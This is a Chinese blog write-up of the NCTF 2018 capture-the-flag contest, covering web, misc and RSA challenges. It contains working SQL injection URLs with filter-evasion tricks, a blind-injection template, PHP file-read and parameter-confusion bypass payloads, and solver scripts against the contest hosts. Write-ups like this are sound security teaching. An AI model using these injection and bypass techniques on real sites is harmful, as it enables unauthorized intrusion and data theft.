---
title: NCTF 2018 Writeup
tags: []
id: '533'
categories:
  - - ctf
date: 2018-11-26 12:28:16
---

这两天和其他大佬参加了NCTF，题目质量不错。我主要负责做web题，期间也去尝试了下pwn的签到，学习了如何使用zio、pwntools。。。最后团队取得了总榜第9的成绩。 ![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/860d441b119f5067f5b0f6f64d663cee.png) ![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bbbbcaf4496afcbc9bf785cb24e55402.png)

* * *

# WEB：

* * *

## 签到题:

* * *

点开题目地址会直接跳转到百度，bp抓包重放下得到flag，不过响应头中的flag才是真正的flag(皮的一匹) ![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/8419ff353800dd9af78dd3d1aad614ad.png)  

## 滴！晨跑打卡:

* * *

访问后是一个可以输入数字查询对应打卡信息的页面，应该是sql注入：![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bc456e1ed0688062730d2bf0401de8c5.png) 经过尝试，题目过滤了 “空格”,"\*","-"，可以使用如下代替：

```
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/   两个空格代替一个空格，用Tab代替空格，%a0=空格：
```

如下payload都可以取出flag：

```
http://ctfgame.acdxvfsvd.net:20001/?id=99999'%a0union%a0select%a0user(),(SELECT%a0GROUP_CONCAT(th1s_1s_flag%a0SEPARATOR%a00x3c62723e)%a0FROM%a0flaaaaaaag.f144444444g),3'1

http://ctfgame.acdxvfsvd.net:20001/index.php?id=999999'union(SELECT%0bGROUP_CONCAT(th1s_1s_flag),2,3%0bFROM%0bflaaaaaaag.f144444444g%0b);%00

盲注payload：
"http://ctfgame.acdxvfsvd.net:20001/index.php?id=2%27substr((select(th1s_1s_flag)from(flaaaaaaag.f144444444g)limit%0b0,1),"+str(i)+",1)='"+chr(j)
```

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/0d09b48904574a4cc80be509b08a21cf.png) 附上sql绕过方法:[http://www.cnblogs.com/Vinson404/p/7253255.html](http://www.cnblogs.com/Vinson404/p/7253255.html)

## Go Lakers:

* * *

和签到题一样，打开会自动跳转到百度，bp抓包重放，返回包拉到最下面可以看见post me viewsource![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/2093a0bb02703e0b877c1eeb591539a1.png)

然后，修改包为POST数据包，添加上:

```
Content-Type: application/x-www-form-urlencoded
```

即可看到返回的源码![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/404977b1a19d3d6c99a00882d6cd07b2.png) 由于编码问题，需要导出为html文件，用浏览器打开即可

```
<?php 
error_reporting(0); 
include 'getip.php'; 
ini_set('open_basedir','.'); 
if(isset($_POST['viewsource'])){ 
    highlight_file(__FILE__); 
    die(); 
} 

mt_srand(mktime()+$seed); 

function de_code($value){ 
    $value = base64_decode($value); 
    $result = ''; 
    for($i=0;$i<strlen($value);$i++){ 
        $result .= chr(ord($value[$i])-$i*2); 
    } 
    return $result; 
} 

if(!(getip() === '127.0.0.1' && file_get_contents($_GET['9527']) === 'nctf_is_good' && mt_rand(1,10000) === intval($_GET['go_Lakers']))){ 
    header('location:http://www.baidu.com'); 
}else{ 
    echo 'great'; 
} 

echo file_get_contents(de_code($_GET['file_'])); 

?> 
```

仔细阅读可以发现，除了`post viewsource`时，整个脚本只会结束到die那意外，其他情况都是会执行到最后的

```
echo file_get_contents(de_code($_GET['file_'])); 
```

所以，我们需要利用这个点进行文件读取，`$_GET['file_']`经过`de_code`函数加密，所以这里传入的值应该是加密后的字符串，写出加密函数:

```
function en_code($value){
    $result = ''; 
    for($i=0;$i<strlen($value);$i++){ 
        $result .= chr(ord($value[$i])+$i*2); 
    }
    $result = base64_encode($result);
    return $result;
}
```

对`flag.php`加密：`Zm5lbTZ6dH4=`请求后得到flag ![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/5120453c797acafd6e24a91c26d3c75d.png) 题外话：前面的IP、9527、随机数都是迷惑条件。。。 通过读取`getip.php`可以看到`getip.php`源码

```
<?php
$seed = '2163713';
function getip(){
        if($_SERVER['HTTP_X_FORWARDED_FOR']){
            die('X_FORWARDED_FOR is good,but can you find another one?');
        } elseif($_SERVER['HTTP_CLIENT_IP']){
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else{
            $ip = $_SERVER['REMOTE_ADDR'];
         }
       $ip  = preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$ip) ? $ip : 'Unknown';
       // echo $ip;
       return $ip;
    }
```

由此，取出来的是`HTTP_CLIENT_IP`,$seed也知道，就可以预测某秒钟产生的随机值(`mktime()`函数秒为单位),通过预测，然后用bp一直提交该预测出的随机值，服务器果然返回了great!！！![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bd6af7a4dfbe161064b93a9cb8f51187.png)

## 全球最大交友网站

* * *

看到题目想到了应该是`.git`源码泄露，在题目连接后加上`/.git/HEAD`,证明的确存在![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/89ae2a0035f5aa42c0f28caa9b47cf26.png) 于是使用`GitHack`恢复源码，恢复出来的readme文件显示在tag1.0，于是使用`Git_Extract`将所有版本拖下来，得到flag![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/4161a0fea063946d1fda174a186a33f1.png)

## 小绿草之最强大脑

* * *

这个题竟然拿到了一血，也是很意外。可能大家都绕在了32位和64位的这个点上。打开题目，让自己设一个21位以上的数和网页上已经给出的算式相加，将自己设的数和计算后的答案通过post提交。![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/8c668f827e02cc795ac5d8c56fa4d1e0.png) html注释里写着源码泄露了解下，于是访问`index.php.bak`下载了源码如下：

```
<?php
if(isset($_SESSION['ans']) && isset($_POST['ans'])){
if(($_SESSION['ans'])+intval($_POST['input'])!=$_POST['ans']){
session_destroy();
echo '
<script language="javascript">  
alert("怎么没算对呢？");  
window.history.back(-1);  </script>';
}
else{
if(intval(time())-$_SESSION['time']<1){
session_destroy();
echo '
<script language="javascript">  
alert("你手速太快啦，服务器承受不住!!!");  
window.history.back(-1); </script> ';
}
if(intval(time())-$_SESSION['time']>2){
session_destroy();
echo '
<script language="javascript">  
alert("你算的太慢了少年！");  
window.history.back(-1); </script> ';
}
echo '
<script language="javascript">  
alert("tql，算对了！！");  
     </script> ';
$_SESSION['count']++;
}
}
?>
```

注意到input值是经过intval转换的，而且有严格校验只能是纯数字，官方文档里面对intval函数有如下描述:![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/e0512df51e526a37b3a9ce0fe54ef8b8.png) 所以实际是将网页上的算式和32位或64位所能表示的最大的数进行相加，而提交的时候只需要input值为一个21位以上的数字字符串，脚本如下(得好好学正则了，每次都string\[1:3\]太真实了)：

```
#/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import time
import re

url = 'http://ctfgame.acdxvfsvd.net:20004/index.php'

def get(calu):
    obj = ''
    tmp = re.findall(r'<div style="display:inline;">(.*?)</div>',calu)
    obj = obj.join(tmp)
    obj = "9223372036854775807+"+obj[:-1]
    time.sleep(1)
    post(eval(obj))


def post(ans):
    post_data = {'input':123456789012345678902376575475476547547,'ans':ans}
    print post_data
    r = ss.post(url=url,data=post_data)
    if 'nctf' in r.text:
        print r.text
        exit(0)
    else:
        get(r.content)

ss=requests.session()
r = ss.get(url)
get(r.text)
```

  ![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/70d53c8bfed5a4dba14c02f47b3dbdde.png)

## easy\_audit

* * *

访问题目直接给出了源码。

```
<?php 
highlight_file(__FILE__); 
error_reporting(0); 
if($_REQUEST){ 
    foreach ($_REQUEST as $key => $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..'); 
    } 
} 

if($_SERVER){ 
    if(preg_match('/yuligeflagnctf/i', $_SERVER['QUERY_STRING']))  die('waf..'); 
} 

if(isset($_GET['yulige'])){ 
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!! 
        die('waf..'); 
    }else{ 
        if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun'){ 
            $getflag = file_get_contents($_GET['flag']); 
        } 
        if(isset($getflag) && $getflag === 'ccc_liubi'){ 
            include 'flag.php'; 
            echo $flag; 
        }else die('waf..'); 
    } 
} 
?> 
```

中途遇到了很多问题，本地尝试了很多次，随后查看各个函数的php官方文档才找出最终的绕过方法，主要有以下几个点： 1.`request_order='GPC'`时 `$_REQUEST`会按照`($_COOKIE)>$_POST>$_GET`变量覆盖 也就是get方式传`nctf=1`和post方式传`nctf=2`在同时传递的时候，`$_REQUES`里`nctf=2` 2. `$_SERVER['QUERY_STRING']`这个变量是取得原始url查询串，并没有url解码，所以如果传`?nct%66=1 `   `$_SERVER['QUERY_STRING']`的值仍然是`nct%66=1` [http://web.chacuo.net/charseturlencode](http://web.chacuo.net/charseturlencode)这个网站可以将普通字符url编码 3. Md5加密数组返回值为NULL，substr截取数组也会返回NULL 4. `preg_match('/nctfisfun$/)` 这个只需要是nctfisfun结尾就能满足 5. 最后的`file_get_contents($_GET['flag'])`，不能用原来的php://input，因为post有其他数据，所以用的`data://text/plain;base64,Y2NjX2xpdWJ` ，其中`Y2NjX2xpdWJ`即为ccc\_liubi的base64编码(我在本地尝试过通过`http协议`获取远程内容为ccc\_liubi的文件，可以getflag，然而题目地址不行)

```
payload数据包：
POST /?%79%75%6c%69%67%65[]=1&nct%66=1n%63%74%66%69%73%66%75%6e&%66lag=data://text/plain;base64,Y2NjX2xpdWJp HTTP/1.1
Host: ctfgame.acdxvfsvd.net:20007
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

nctf=1&flag=1
```

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/a6dd71fc0bf0ee02ead3530abc07cc7c.png)

# MISC

* * *

## CalcNow：

* * *

连接上远程端口后，输入Team的token，会返回一个算式，需要在两秒内算好发送过去![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/25299270bb4e12543cd81ab75ec9c838.png) 使用zio模块，编写脚本 getflag

```
from zio import *

r = zio(('47.110.195.228',30003))
r.writeline('JWGthxProBatsx9WcOSJXvyIlndG6qQe')
r.read_until('...\n')
tmp = r.readline()
tmp = tmp.replace(' add ','+').replace(' mul ','*').replace(' xor ','^').replace(' sub ','-')
r.writeline(str(eval(tmp)))
r.read()
```

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/0133d7cf007aba81fe6088b1a3f14fd6.png)  

# Crypto

* * *

## Easy RSA:

题目：

```
n = 24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585089251882243488454602710292507668577598274622372304293403731722318890268908300308478539449464617438721833942643889296634768118375076052778833640986893990732882252524850152650060780854621796349622086656401914022236044924841914313726991826438982902866584892213702893596657746111940812657202364588469026832387629
p - q = 14048479366496281701869293063643750801596179514889914988732592464154208813942939793532694949932787548745769133200541469022315588864587160064703369956054828780928008235304461825448872454098086255531582368864754318040219023548966787642948010656526691472780392631956031751285174567712974691729142190835749586660
e = 65537
c = 13043206753625359891696429504613068427529111016070088678736297291041435652992434742862062899975037273524389833567258051170507686131853178642412748377655159798601888072877427570380109085131089494464136940524560062629558966202744902709909907514127527274581612606840291391818050072220256661680141666883565331886278443012064173917218991474525642412407692187407537171479651983318468186723172013439034765279464665108704671733067907815695414348312753594497823099115037082352616886076617491904991917443093071262488786475411319592529466108485884029307606114810451140886975584959872328937471166255190940884805476899976523580343
```

的却是根据公式`n=pq`  `p-q=14048...`列出一元二次方程组，解出`pq ` 算出私钥`d`   再用`d`解出明文 具体使用工具及方法，参考：[https://blog.csdn.net/CosmopolitanMe/article/details/76321621](https://blog.csdn.net/CosmopolitanMe/article/details/76321621) 最后解出明文m:`m=45411192849370852342508097771685415309715836886014345394100707709` 再用BigIntergerCal转为十六进制转为字符得到flag:`nctf{my_M4th_1s_t00_b4d!!!}`